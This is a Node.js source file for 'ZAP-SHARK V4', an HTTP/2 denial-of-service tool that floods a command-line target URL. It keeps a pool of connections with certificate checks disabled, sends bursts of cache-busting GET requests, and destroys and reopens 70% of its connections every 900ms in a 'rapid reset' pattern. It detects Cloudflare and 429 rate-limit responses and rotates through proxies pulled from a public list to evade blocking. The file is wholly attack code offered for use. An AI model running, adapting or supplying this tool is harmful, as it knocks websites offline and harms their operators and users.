const http2 = require('http2');
const https = require('https');
const os = require('os');
const { exec } = require('child_process');

class ZAPSHARK_V4 {
    constructor(targetUrl) {
        this.targetUrl = targetUrl;
        this.hostname = new URL(targetUrl).hostname;
        this.status = "ATTACKING";
        this.totalRequests = 0;
        this.currentRPS = 0;
        this.startTime = Date.now();
        this.requestsSinceLastCalc = 0;
        this.lastRpsCalc = Date.now();
        this.running = true;
        this.wifiConnected = true;
        
        // PROXY SYSTEM
        this.proxyApi = 'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=5000&country=all';
        this.currentProxy = null;
        this.proxyList = [];
        this.proxyIndex = 0;
        this.proxyStartTime = Date.now();
        this.proxyRotationInterval = 600000; // 10 minutes
        this.cfDetected = false;
        this.lastCfDetection = 0;
        
        // CONNECTION SYSTEM - ULTRA AGGRESSIVE
        this.connectionPool = [];
        this.activeStreams = 0;
        this.poolSize = 30; // MASSIVE POOL
        this.maxStreamsPerConn = 1000;
        this.lastConnectionReset = Date.now();
        this.connectionResetInterval = 900; // RAPID RESET = 900ms
        
        // RESPONSE TRACKING
        this.lastResponseCode = 0;
        this.responseCodeCounts = {};
        this.cfCount = 0;
        this.rateLimitCount = 0;
        
        // MAINTENANCE
        this.lastMaintenance = Date.now();
        this.maintenanceInterval = 3600000;
        
        // INTERVALS
        this.attackInterval = null;
        this.displayInterval = null;
        this.autoRotateInterval = null;
    }

    // === INITIAL CONNECTION ===
    async checkInitialConnection() {
        return new Promise((resolve) => {
            const testClient = http2.connect(this.targetUrl);
            testClient.on('connect', () => {
                console.log('ZAP-SHARK | CONNECTED TO HOST');
                testClient.destroy();
                setTimeout(() => {
                    process.stdout.write('\x1B[2J\x1B[0f');
                    resolve(true);
                }, 10000);
            });
            testClient.on('error', () => {
                testClient.destroy();
                resolve(false);
            });
        });
    }

    // === PROXY MANAGEMENT ===
    async fetchProxies() {
        return new Promise((resolve) => {
            https.get(this.proxyApi, (res) => {
                let data = '';
                res.on('data', (chunk) => data += chunk);
                res.on('end', () => {
                    const proxies = data.trim().split('\n').filter(p => p);
                    this.proxyList = proxies.map(p => p.trim());
                    console.log(`[+] Loaded ${this.proxyList.length} proxies`);
                    resolve(this.proxyList.length > 0);
                });
            }).on('error', () => {
                console.log('[-] Failed to fetch proxies');
                resolve(false);
            }).setTimeout(5000);
        });
    }

    async rotateProxy() {
        if (this.proxyList.length === 0) {
            const fetched = await this.fetchProxies();
            if (!fetched) return false;
        }
        
        this.proxyIndex = (this.proxyIndex + 1) % this.proxyList.length;
        this.currentProxy = this.proxyList[this.proxyIndex];
        this.proxyStartTime = Date.now();
        this.cfDetected = false;
        this.cfCount = 0;
        return true;
    }

    // === ULTRA AGGRESSIVE CONNECTION SYSTEM ===
    setupConnections() {
        // DESTROY ALL
        this.connectionPool.forEach(c => { try { c.destroy(); } catch (e) {} });
        this.connectionPool = [];
        
        // CREATE MASSIVE POOL
        for (let i = 0; i < this.poolSize; i++) {
            try {
                const client = http2.connect(this.targetUrl, {
                    maxSessionMemory: 262144, // 256KB
                    maxDeflateDynamicTableSize: 4294967295,
                    peerMaxConcurrentStreams: 2000,
                    createConnection: () => {
                        // AGGRESSIVE SOCKET SETTINGS
                        const socket = require('tls').connect({
                            host: this.hostname,
                            port: 443,
                            servername: this.hostname,
                            rejectUnauthorized: false,
                            ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-RSA-AES128-GCM-SHA256'
                        });
                        return socket;
                    }
                });
                
                client.setMaxListeners(5000);
                
                // MAXIMUM H2 SETTINGS
                client.settings({
                    enablePush: false,
                    initialWindowSize: 2147483647, // MAX INT
                    maxConcurrentStreams: 2147483647,
                    maxFrameSize: 16777215,
                    maxHeaderListSize: 4294967295
                });
                
                client.on('error', () => {});
                
                this.connectionPool.push(client);
            } catch (err) {}
        }
    }

    // === RAPID RESET = 900ms ===
    resetConnections() {
        const now = Date.now();
        if (now - this.lastConnectionReset >= this.connectionResetInterval) {
            // RESET 70% OF CONNECTIONS EVERY 900ms
            const resetCount = Math.ceil(this.connectionPool.length * 0.7);
            
            for (let i = 0; i < resetCount; i++) {
                const index = Math.floor(Math.random() * this.connectionPool.length);
                if (this.connectionPool[index]) {
                    try {
                        this.connectionPool[index].destroy();
                        
                        // IMMEDIATE REPLACEMENT
                        const newClient = http2.connect(this.targetUrl, {
                            maxSessionMemory: 262144
                        });
                        newClient.setMaxListeners(5000);
                        newClient.on('error', () => {});
                        this.connectionPool[index] = newClient;
                    } catch (err) {}
                }
            }
            
            this.lastConnectionReset = now;
        }
    }

    // === MAXIMUM AGGRESSION REQUEST ===
    sendRequest() {
        if (!this.wifiConnected || this.connectionPool.length === 0) return;
        
        // RAPID RESET
        this.resetConnections();
        
        // MASSIVE STREAM BURST
        const maxStreams = this.maxStreamsPerConn * this.connectionPool.length;
        const availableStreams = maxStreams - this.activeStreams;
        const streamsThisTick = Math.min(availableStreams, 100); // 100 STREAMS PER TICK
        
        for (let i = 0; i < streamsThisTick; i++) {
            const client = this.connectionPool[Math.floor(Math.random() * this.connectionPool.length)];
            if (!client) continue;

            try {
                this.activeStreams++;
                
                const req = client.request({
                    ':method': 'GET',
                    ':path': '/?' + Date.now() + Math.random().toString(36).substr(2, 8),
                    ':authority': this.hostname,
                    'user-agent': 'Mozilla/5.0',
                    'accept': '*/*',
                    'accept-encoding': 'gzip, deflate, br',
                    'cache-control': 'no-cache'
                });
                
                req.on('response', (headers) => {
                    const code = headers[':status'] || 0;
                    this.lastResponseCode = code;
                    this.responseCodeCounts[code] = (this.responseCodeCounts[code] || 0) + 1;
                    
                    // CLOUDFLARE DETECTION
                    if (code === 403 || code === 503 || 
                        headers['server'] === 'cloudflare' ||
                        headers['cf-ray']) {
                        this.cfCount++;
                        if (this.cfCount > 5) {
                            this.cfDetected = true;
                            this.lastCfDetection = Date.now();
                        }
                    }
                    
                    // RATE LIMIT DETECTION
                    if (code === 429) {
                        this.rateLimitCount++;
                        if (this.rateLimitCount > 3) {
                            this.rotateProxy();
                        }
                    }
                });
                
                req.on('error', () => {});
                
                req.on('close', () => {
                    this.activeStreams--;
                    this.totalRequests++;
                    this.requestsSinceLastCalc++;
                });
                
                req.end();
                
            } catch (err) {
                this.activeStreams--;
                this.totalRequests++;
                this.requestsSinceLastCalc++;
            }
        }
    }

    // === AUTO PROXY ROTATION ===
    checkProxyRotation() {
        const now = Date.now();
        
        // AUTO ROTATE EVERY 10 MINUTES
        if (now - this.proxyStartTime >= this.proxyRotationInterval) {
            this.rotateProxy();
        }
        
        // IMMEDIATE ROTATION ON CF/429
        if (this.cfDetected && now - this.lastCfDetection < 5000) {
            this.rotateProxy();
        }
    }

    // === STATS ===
    calculateRPS() {
        const now = Date.now();
        const timeDiff = (now - this.lastRpsCalc) / 1000;
        
        if (timeDiff >= 0.9) {
            this.currentRPS = this.requestsSinceLastCalc / timeDiff;
            this.requestsSinceLastCalc = 0;
            this.lastRpsCalc = now;
        }
    }

    getMostCommonResponseCode() {
        let maxCount = 0;
        let mostCommonCode = this.lastResponseCode || 0;
        
        for (const [code, count] of Object.entries(this.responseCodeCounts)) {
            if (count > maxCount) {
                maxCount = count;
                mostCommonCode = parseInt(code);
            }
        }
        return mostCommonCode;
    }

    getTimeUntilMaintenance() {
        const now = Date.now();
        const nextMaintenance = this.lastMaintenance + this.maintenanceInterval;
        const timeLeft = nextMaintenance - now;
        
        if (timeLeft <= 0) return "NOW";
        
        const minutes = Math.floor(timeLeft / 60000);
        const seconds = Math.floor((timeLeft % 60000) / 1000);
        return `${minutes}m ${seconds}s`;
    }

    getProxyTimeLeft() {
        const now = Date.now();
        const timeUsed = now - this.proxyStartTime;
        const timeLeft = this.proxyRotationInterval - timeUsed;
        
        if (timeLeft <= 0) return "ROTATING...";
        
        const minutes = Math.floor(timeLeft / 60000);
        const seconds = Math.floor((timeLeft % 60000) / 1000);
        return `${minutes}m ${seconds}s`;
    }

    // === LOGGING ===
    updateDisplay() {
        this.calculateRPS();
        
        const now = new Date();
        const localTime = now.toLocaleTimeString('en-US', { 
            hour12: false,
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit'
        });
        
        const runtime = Math.floor((Date.now() - this.startTime) / 1000);
        const runtimeMinutes = Math.floor(runtime / 60);
        const runtimeSeconds = runtime % 60;
        const runtimeStr = `${runtimeMinutes.toString().padStart(2, '0')}:${runtimeSeconds.toString().padStart(2, '0')}`;
        
        const liveResponseCode = this.getMostCommonResponseCode();
        const proxyDisplay = this.currentProxy ? 
            this.currentProxy.split(':')[0] + ':****' : 
            'DIRECT';
        
        const cfStatus = this.cfDetected ? ' | CF: YES' : '';
        const rateLimitStatus = this.rateLimitCount > 0 ? ` | 429: ${this.rateLimitCount}` : '';
        
        // CLEAR AND OVERWRITE
        process.stdout.write('\x1B[2J\x1B[0f');
        console.log(`ZAP-SHARK — (${runtimeStr}) | SAM: ${localTime}`);
        console.log('=================================');
        console.log(`SHARK-TRS — ${this.totalRequests}`);
        console.log(`SHARK-LHC — ${liveResponseCode}${cfStatus}${rateLimitStatus}`);
        console.log('=================================');
        console.log(`ZAP-SHARK | ${proxyDisplay} | ${this.getTimeUntilMaintenance()}`);
        
        // REAL-TIME STATS
        process.stdout.write(`\n[RPS: ${this.currentRPS.toFixed(1)} | POOL: ${this.connectionPool.length}/${this.poolSize} | ACTIVE: ${this.activeStreams}]`);
    }

    // === MAIN ===
    async start() {
        console.log('=== ZAP-SHARK V4 - RAPID RESET = 900 ===');
        console.log('Target:', this.targetUrl);
        console.log('Rapid Reset: 900ms | Proxy Rotation: 10min | Auto-CF/429');
        console.log('='.repeat(60));
        
        // INITIAL CONNECTION
        const connected = await this.checkInitialConnection();
        if (!connected) {
            console.log('Failed to connect to target');
            process.exit(1);
        }
        
        // LOAD PROXIES
        await this.fetchProxies();
        if (this.proxyList.length > 0) {
            this.currentProxy = this.proxyList[0];
        }
        
        // SETUP AGGRESSIVE CONNECTIONS
        this.setupConnections();
        
        // START SYSTEMS
        setTimeout(() => {
            // ULTRA AGGRESSIVE ATTACK (20 BATCHES PER TICK)
            this.attackInterval = setInterval(() => {
                if (this.status === "ATTACKING") {
                    for (let i = 0; i < 20; i++) {
                        this.sendRequest();
                    }
                }
            }, 0.02); // 50ms INTERVAL
            
            // DISPLAY UPDATE
            this.displayInterval = setInterval(() => {
                this.updateDisplay();
            }, 90); // UPDATE EVERY 90ms
            
            // PROXY ROTATION CHECK
            this.autoRotateInterval = setInterval(() => {
                this.checkProxyRotation();
            }, 1000); // CHECK EVERY SECOND
            
            // MAINTENANCE
            setInterval(() => {
                const now = Date.now();
                if (now - this.lastMaintenance >= this.maintenanceInterval) {
                    this.status = "PAUSED";
                    setTimeout(() => {
                        this.status = "ATTACKING";
                        this.lastMaintenance = Date.now();
                    }, 600000);
                }
            }, 30000);
            
        }, 1000);
        
        process.on('SIGINT', () => {
            this.running = false;
            clearInterval(this.attackInterval);
            clearInterval(this.displayInterval);
            clearInterval(this.autoRotateInterval);
            console.log('\n=== ZAP-SHARK V4 STOPPED ===');
            process.exit(0);
        });
    }
}

// USAGE
const target = process.argv[2];
if (!target || !target.startsWith('https://')) {
    console.log('Usage: node zap-shark-v4.js https://target.com');
    process.exit(1);
}

const shark = new ZAPSHARK_V4(target);
shark.start();
